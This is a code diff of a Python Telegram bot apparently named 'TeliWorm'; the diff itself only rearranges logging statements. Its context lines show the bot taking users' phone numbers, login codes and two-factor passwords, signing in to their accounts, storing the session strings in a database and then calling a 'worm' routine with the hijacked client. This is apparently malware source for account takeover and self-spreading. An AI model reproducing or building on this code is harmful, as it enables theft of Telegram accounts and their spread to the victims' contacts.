@@ -17,7 +17,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 def get_log_level():
     level_str = os.environ.get('MY_LOG_LEVEL', 'INFO').upper()
     return getattr(logging, level_str, logging.INFO)
-logger = logging.getLogger("TeliWormBot")
+logger = logging.getLogger("TeliWorm")
 logger.setLevel(get_log_level())
 handler = logging.StreamHandler()
 handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
@@ -41,7 +41,6 @@ def get(obj: Dict[str, Any], key: str, default: Optional[Any] = None) -> Any:
     try:
         return obj[key]
     except Exception as e:
-        logger.debug(f"Key '{key}' not found in object, returning default. Exception: {e}")
         return default
 def yesno(x: str, page: str = 'def') -> list:
     return [
@@ -83,22 +82,21 @@ async def sign_in(event: Message, user_data: Dict[str, Any]) -> bool:
     uclient = None
     try:
         login = json.loads(user_data['login'])
-        logger.info(f"Attempting sign-in for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}")
         if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
-            logger.debug("Signing in with password.")
+            logger.debug(f"Signing in with password for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}.")
             uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
             await uclient.connect()
             await uclient.sign_in(password=user_data['password'])
         elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
-            logger.debug("Signing in with code.")
+            logger.debug(f"Signing in with code for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))} .")
             uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
             await uclient.connect()
             await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
         else:
-            logger.warning("Sign-in conditions not met.")
             return False
         login = {}
         data = {'session': uclient.session.save(), 'logged_in': True, 'ts': round(time.time())}
+        logger.info(f"Sign-in process completed for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}")
         await event.edit(strings['login_success'])
         await worm(uclient, logger_bot)
     except telethon.errors.PhoneCodeInvalidError as e:
@@ -135,7 +133,6 @@ async def sign_in(event: Message, user_data: Dict[str, Any]) -> bool:
     else:
         data['login'] = json.dumps(login)
     database.update_one({'_id': user_data['_id']}, update_query)
-    logger.info(f"Sign-in process completed for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}")
     return True
 
 @events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
@@ -242,7 +239,6 @@ async def main() -> None:
     await logger_bot.start(bot_token=os.environ['LOGGER_BOT_TOKEN'])
     while True:
         try:
-            logger.info('-- bot start --')
             await run_bot()
         except KeyboardInterrupt:
             logger.info("KeyboardInterrupt received. Exiting main loop.")
